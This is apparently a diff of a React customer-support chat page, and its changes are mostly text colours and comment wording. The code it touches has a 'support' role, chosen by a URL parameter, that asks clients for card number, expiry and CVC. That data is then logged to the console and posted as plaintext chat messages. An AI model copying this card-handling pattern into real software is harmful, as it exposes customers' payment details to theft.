@@ -35,7 +35,7 @@ type Message = {
   id?: string;
   sender: string; // "support" | "client"
   text: string;
-  // New field to distinguish message purposes
+  // Message purpose type
   messageType?: "text" | "secure_form_request" | "secure_form_response";
   timestamp?: Timestamp;
   transactionId: string;
@@ -113,14 +113,14 @@ function SecureForm({ onSubmit, onCancel }: SecureFormProps) {
 
   return (
     <form onSubmit={handleSubmit} style={secureFormStyle}>
-      <h4 style={{ marginBottom: "10px" }}>Secure Form</h4>
+      <h4 style={{ marginBottom: "10px", color: "black" }}>Secure Form</h4>
       <input
         type="text"
         name="cardHolder"
         placeholder="Card Holder Name"
         value={formData.cardHolder}
         onChange={handleChange}
-        style={secureInputStyle}
+        style={{ ...secureInputStyle, color: "black" }}
       />
       <input
         type="text"
@@ -128,7 +128,7 @@ function SecureForm({ onSubmit, onCancel }: SecureFormProps) {
         placeholder="Card Number"
         value={formData.cardNumber}
         onChange={handleChange}
-        style={secureInputStyle}
+        style={{ ...secureInputStyle, color: "black" }}
       />
       <input
         type="text"
@@ -136,7 +136,7 @@ function SecureForm({ onSubmit, onCancel }: SecureFormProps) {
         placeholder="Expiry (MM/YY)"
         value={formData.expiry}
         onChange={handleChange}
-        style={secureInputStyle}
+        style={{ ...secureInputStyle, color: "black" }}
       />
       <input
         type="text"
@@ -144,7 +144,7 @@ function SecureForm({ onSubmit, onCancel }: SecureFormProps) {
         placeholder="CVC"
         value={formData.cvc}
         onChange={handleChange}
-        style={secureInputStyle}
+        style={{ ...secureInputStyle, color: "black" }}
       />
       <div style={{ marginTop: "10px" }}>
         <button type="submit" style={secureButtonStyle}>
@@ -164,10 +164,10 @@ function SecureForm({ onSubmit, onCancel }: SecureFormProps) {
 function ChatContent() {
   const searchParams = useSearchParams();
   const initialTx = searchParams.get("tx") || "";
-  // Role: "support" or "client" (e.g., via ?role=support)
+  // Role: "support" or "client" (passed via query, e.g., ?role=support)
   const role = searchParams.get("role") || "client";
 
-  // Main state for chat (all hooks are unconditionally called)
+  // Main state for chat
   const [transactionId, setTransactionId] = useState(initialTx);
   const [messages, setMessages] = useState<Message[]>([]);
   const [chatInput, setChatInput] = useState("");
@@ -243,7 +243,7 @@ function ChatContent() {
     }
   }, [messages]);
 
-  // For client: show secure form if a secure form request message is present.
+  // On the client side, display secure form if a secure form request message is found.
   useEffect(() => {
     if (role === "client") {
       const hasSecureRequest = messages.some(
@@ -255,14 +255,14 @@ function ChatContent() {
     }
   }, [messages, role]);
 
-  // Define containerAnimationStyle here
+  // Define container animation style
   const containerAnimationStyle: React.CSSProperties = {
     opacity: containerLoaded ? 1 : 0,
     transform: containerLoaded ? "translateY(0)" : "translateY(20px)",
     transition: "opacity 0.5s ease-out, transform 0.5s ease-out",
   };
 
-  // Chat Functions
+  // Chat functions
   const sendMessage = async (
     text: string,
     messageType: Message["messageType"] = "text"
@@ -290,13 +290,16 @@ function ChatContent() {
 
   // For support: send a secure form request message
   const handleSendSecureFormRequest = async () => {
-    await sendMessage("Secure form request: Please fill out the secure form.", "secure_form_request");
+    await sendMessage(
+      "Secure form request: Please fill out the secure form.",
+      "secure_form_request"
+    );
   };
 
-  // When client submits secure form
+  // When the client fills out the secure form
   const handleSecureFormSubmit = async (data: { cardHolder: string; cardNumber: string; expiry: string; cvc: string }) => {
     console.log("Received secure form data:", data);
-    // WARNING: Do not send sensitive details in plaintext in production.
+    // WARNING: In production, do not send sensitive details in plaintext.
     await sendMessage(JSON.stringify(data), "secure_form_response");
     setShowSecureForm(false);
   };
@@ -321,7 +324,7 @@ function ChatContent() {
       {(!transactionId || transactionId === "support-chat") ? (
         <TransactionForm onSubmit={(tx) => setTransactionId(tx)} />
       ) : loading ? (
-        <h2 style={{ color: "black", textAlign: "center", marginTop: "50px" }}>
+        <h2 style={{ textAlign: "center", marginTop: "50px", color: "black" }}>
           Loading...
         </h2>
       ) : (
@@ -368,7 +371,7 @@ function ChatContent() {
               )}
             </form>
 
-            {/* For client: display secure form if requested */}
+            {/* For client: display secure form if a secure form request message exists */}
             {role === "client" && showSecureForm && (
               <SecureForm
                 onSubmit={handleSecureFormSubmit}
@@ -379,7 +382,7 @@ function ChatContent() {
 
           {/* Sidebar for Pre-composed Messages */}
           <div style={sidebarStyle}>
-            <h3>Pre-composed Messages</h3>
+            <h3 style={{ color: "black" }}>Pre-composed Messages</h3>
             {preComposedMessages.map((msg) => (
               <div
                 key={msg.id}
@@ -390,7 +393,7 @@ function ChatContent() {
                   borderRadius: "5px",
                 }}
               >
-                <span>{msg.text}</span>
+                <span style={{ color: "black" }}>{msg.text}</span>
                 <div style={{ marginTop: "5px" }}>
                   <button onClick={() => sendMessage(msg.text)} style={preComposedButtonStyle}>
                     Send
@@ -417,7 +420,7 @@ function ChatContent() {
                       type="text"
                       value={editingPreComposedText}
                       onChange={(e) => setEditingPreComposedText(e.target.value)}
-                      style={{ ...chatInputStyle, marginBottom: "5px" }}
+                      style={{ ...chatInputStyle, marginBottom: "5px", color: "black" }}
                     />
                     <div>
                       <button
@@ -457,7 +460,7 @@ function ChatContent() {
 // ---------------------------
 export default function SupportChat() {
   return (
-    <Suspense fallback={<div style={{ textAlign: "center", marginTop: "50px" }}>Loading chat...</div>}>
+    <Suspense fallback={<div style={{ textAlign: "center", marginTop: "50px", color: "black" }}>Loading chat...</div>}>
       <ChatContent />
     </Suspense>
   );
@@ -585,6 +588,7 @@ const secureInputStyle: React.CSSProperties = {
   fontSize: "14px",
   borderRadius: "4px",
   border: "1px solid #ccc",
+  color: "black",
 };
 
 const secureButtonStyle: React.CSSProperties = {
